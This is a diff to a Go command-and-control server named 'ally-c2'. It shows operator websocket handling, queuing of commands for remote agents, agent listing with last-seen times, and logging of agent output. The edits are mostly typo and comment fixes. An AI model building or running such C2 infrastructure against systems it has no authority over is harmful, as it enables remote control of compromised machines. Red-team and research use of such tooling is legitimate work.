@@ -120,7 +120,7 @@ func handleOperator(c *gin.Context) {
 	operatorConn = conn
 	operatorConnMu.Unlock()
 
-	//clean them variable when the ws close
+	// clean up variables when the websocket closes
 	defer func() {
 		operatorConnMu.Lock()
 		operatorConn = nil
@@ -185,7 +185,7 @@ func handleOperator(c *gin.Context) {
 			clients[agentID].TaskQueue = append(clients[agentID].TaskQueue, command)
 			mu.Unlock()
 
-			log.Printf("[+] Task '%s' accorded for agent: %s", command, agentID)
+			log.Printf("[+] Task '%s' queued for agent: %s", command, agentID)
 
 			wsjson.Write(ctx, conn, map[string]string{
 				"status": "success",
@@ -194,9 +194,14 @@ func handleOperator(c *gin.Context) {
 
 		} else if action == "list_agents" {
 			mu.Lock()
-			var agentList []string
-			for id := range clients {
-				agentList = append(agentList, id)
+			var agentList []map[string]interface{}
+			for _, session := range clients {
+				// Calcola i secondi trascorsi direttamente in Go
+				secondsAgo := int(time.Since(session.LastSeen).Seconds())
+				agentList = append(agentList, map[string]interface{}{
+					"id":          session.ID,
+					"seconds_ago": secondsAgo,
+				})
 			}
 			mu.Unlock()
 
@@ -204,6 +209,8 @@ func handleOperator(c *gin.Context) {
 				"status": "success",
 				"agents": agentList,
 			})
+		
+		
 
 		} else if action == "update_beacon" {
 			agentID := msg["agent_id"].(string)
@@ -303,7 +310,7 @@ func main() {
 		}
 		mu.Unlock()
 
-		log.Printf("\n[Output form agent: %s]:\n%s\n", req.ID, req.Output)
+		log.Printf("\n[Output from agent: %s]:\n%s\n", req.ID, req.Output)
 
 		eventConnMu.Lock()
 		if eventConn != nil {
@@ -324,7 +331,7 @@ func main() {
 
 	port := ":8080"
 
-	// connection error error 
+	// connection error 
 	log.Printf("[*] ally-c2 server (Go) listening on %s...", port)
 
 
